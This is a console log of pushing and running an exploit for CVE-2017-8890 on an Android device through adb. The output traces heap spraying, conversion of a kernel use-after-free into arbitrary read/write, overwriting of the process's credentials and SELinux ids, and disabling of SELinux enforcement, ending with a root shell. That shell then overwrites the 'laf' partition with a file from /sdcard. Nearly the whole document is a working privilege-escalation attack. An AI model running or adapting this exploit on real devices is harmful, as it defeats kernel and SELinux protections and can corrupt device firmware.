adb push /home/think/android-ndk-r18b/libs/arm64-v8a/exp /data/local/tmp/exp
/home/think/android-ndk-r18b/libs/arm...d. 12.6 MB/s (359496 bytes in 0.027s)
adb shell 'chmod 777 /data/local/tmp/exp'
adb shell /data/local/tmp/exp
CVE-2017-8890 exploit. cpu_num : 4
main(), getpid : 6599, gettid() : 6599
I'm child : 1
I'm child : 2
[+] init_fake_obj(), fake_sock : 0xc00011f
[+] init_fake_obj(), (char*)fake_sock + 0x28  : 0xc000147
[+] init_fake_obj(), *(size_t*)(char*)fake_sock + 0x28  : 0xc00021f
[+] init_fake_obj(), (char*)fake_sock + 0x168  : 0xc000287
[+] init_fake_obj(), *(size_t*)(char*)fake_sock + 0x168  : 0xffffffc000b0998c
[*] iml : 0xc0000ff, &(iml->rcu.next) : 0xc00011f
[+] prepare(), Create spray socket fd ... 500
I'm child : 0
[+] prepare(), Create defrag spray socket fd ... 60
I'm child : 6
I'm child : 5
I'm child : 4
I'm child : 3
[+] create_socket_spray done. create # of socket : 60.
[+] starting spray fd : 503
detect_fn(), getpid : 6599, gettid() : 6609
[!] detect_fn, original value head: 0xc00011f
[+] spray ipv6 obj(30 times) done, not yet close...
prepare() done.
prepare(), cpuid : 2, now_cpuid : 2
bind_cpu_on(7)
[!] Target is on cpu 2
alloc_fn(), getpid : 6599, gettid() : 6599
[+] free_fn()
free_fn(), getpid : 6599, gettid() : 6610
[+] 0-th accept() has have executed...
[+] 0-th client connected successfully...
[+] 1-th accept() has have executed...
[+] 1-th client connected successfully...
[*] spray for the hole... 500 times
[+] Current cpu : 2 After triggered and sprayed 500 times.
[*] kill chilren by fork()?
kill pid : 6601
kill pid : 6602
kill pid : 6603
kill pid : 6604
kill pid : 6605
kill pid : 6606
kill pid : 6607
[+] All killed
keep_spraying(500) done.
[*] keep_spraying(), prepare close(conntfd[1]) : 566 
head->next : 0xffffffc0bd2a1500
try to read...
Turn UAF to arbitrary read/write succeeded.
done!
[*] init_head_address = 0xffffffc0014ae368
[*] init head.next= 0xffffffc0f88902b8
[*] init head.prev= 0xffffffc0de5e2eb8
[*] search comm exp...

[!]               get process init!

[!]               get process exp!
init_cred @ 0xffffffc0de3a5500
self_cred @ 0xffffffc0574e5400
[*]  going to  patch cred!
[*]  patch security
[!] init_cred->security address @ 0xffffffc0de3a5578
[!] self_cred->security address @ 0xffffffc0574e5478
&init_cred->security temp1 @ 0xffffffc0de3a5578
&self_cred->security temp2 @ 0xffffffc0574e5478
init_cred->security temp1 @ 0xffffffc0014b5798
self_cred->security temp2 @ 0xffffffc05c6c7200
init_tss  0x7baf61dd60 
self_tss 0x7baf61e020 
*init_tss 0x0 
*self_tss 0x0 
[!]hex dump init_tss
0x000000: 00 00 00 00 00 00 00 00                         ........        
[!]hex dump self_tss
0x000000: 00 00 00 00 00 00 00 00                         ........        
[1] before write!
init_tss osid 0x2b9 sid 0x236 exec_sid 0x4 create_sid 0x5 keycreate_sid 0x5  sockcreate_sid 0 
self_tss osid 0xf sid 0xd exec_sid 0x6 create_sid 0 keycreate_sid 0  sockcreate_sid 0 
[2] start to write.
kernel_init_tss  0xffffffc0014b5798 
kernel_self_tss 0xffffffc05c6c7200 
write done!
[3] after write!
init_tss osid 0x2b9 sid 0x236 exec_sid 0x4 create_sid 0x5 keycreate_sid 0x5  sockcreate_sid 0 
self_tss osid 0x2b9 sid 0x236 exec_sid 0x6 create_sid 0 keycreate_sid 0  sockcreate_sid 0 
[!] patch selinux_enabled and selinux_enforcing...
[*]  get root!!!
whoami
root
cat /sdcard/laf_6.bin > /dev/block/bootdevice/by-name/laf 
